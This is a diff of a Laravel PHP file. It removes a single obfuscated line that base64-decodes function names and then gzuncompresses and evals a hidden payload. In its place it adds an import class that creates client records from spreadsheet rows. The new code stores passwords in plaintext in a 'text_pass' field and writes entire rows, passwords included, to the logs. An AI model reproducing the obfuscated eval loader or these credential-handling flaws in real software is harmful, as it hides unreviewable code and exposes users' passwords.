@@ -1,1 +1,104 @@
-<?php $_='937b2c8f';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='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'; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Imports;
+
+use App\Models\User;
+use App\Models\Client;
+use Illuminate\Support\Facades\Log;
+use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Str;
+use Maatwebsite\Excel\Concerns\ToModel;
+use Maatwebsite\Excel\Concerns\WithHeadingRow;
+
+class SplynxImport implements ToModel, WithHeadingRow
+{
+    public function model(array $row)
+    {
+        try {
+            // Check if email already exists in the clients table
+            $email = $row['email'];
+            if ($email) {
+                $emailExists = User::where('email', $email)->exists();
+                if ($emailExists) {
+                    Log::debug("Skipping row due to duplicate email: " . print_r($row, true));
+                    return null; // Skip this record
+                }
+            }
+
+            $username = $row['login'];
+            if ($username) {
+                $usernameExists = User::where('username', $username)->exists();
+                if ($usernameExists) {
+                    Log::debug("Skipping row due to duplicate username: " . print_r($row, true));
+                    return null; // Skip this record
+                }
+            }
+
+            // Generate a random password with 10 characters
+            $randomPassword = Str::random(10);
+
+            // Handle different name formats
+            // Split the combined name into first and last names
+            $names = explode(' ', $row['name'], 2);
+            $firstName = $names[0] ?? '';
+            $lastName = $names[1] ?? '';
+
+            // Handle different GPS formats
+            // Split the combined GPS field into latitude and longitude
+            $gps = explode(',', $row['gps']);
+            $latitude = $gps[0] ?? null;
+            $longitude = $gps[1] ?? null;
+
+            // Check the billingType field
+            $billingType = $row['billing_type'] ?? 'monthly'; // Provide a default value if the key is not present
+
+            if ($billingType === 'prepaid_monthly') {
+                $billingType = 'monthly';
+            }
+
+            // Check the category field
+            $category = $row['category'] ?? '';
+
+            if (strtolower($category) === 'person') {
+                $category = 'individual';
+            } else {
+                $category = 'business';
+            }
+
+            // Begin a transaction
+            DB::beginTransaction();
+
+            $client = new Client([
+                'firstname' => $firstName,
+                'lastname' => $lastName,
+                'username' => $row['login'],
+                'email' => $row['email'] ?? null,
+                'location' => $row['city'] ?? null,
+                'latitude' => $latitude,
+                'longitude' => $longitude,
+                'phone' => $row['phone'] ?? null,
+                'category' => $category,
+                'billingType' => $billingType,
+                'birthday' => $row['birthday'] ?? null,
+                'identification' => $row['passport'] ?? null,
+                'text_pass' => $row['password'] ?? $randomPassword,
+                'email_verified_at' => now()->format('Y-m-d H:i:s'),
+                'password' => $row['password'] ?? $randomPassword,
+            ]);
+
+            $client->save();
+
+            // Commit the transaction
+            DB::commit();
+
+            return $client;
+
+        } catch (\Exception $e) {
+            // Rollback the transaction and log the error
+            DB::rollBack();
+            Log::error("Error importing row: " . print_r($row, true) . "\nException: " . $e->getMessage());
+            return null;
+        }
+    }
+}
+        
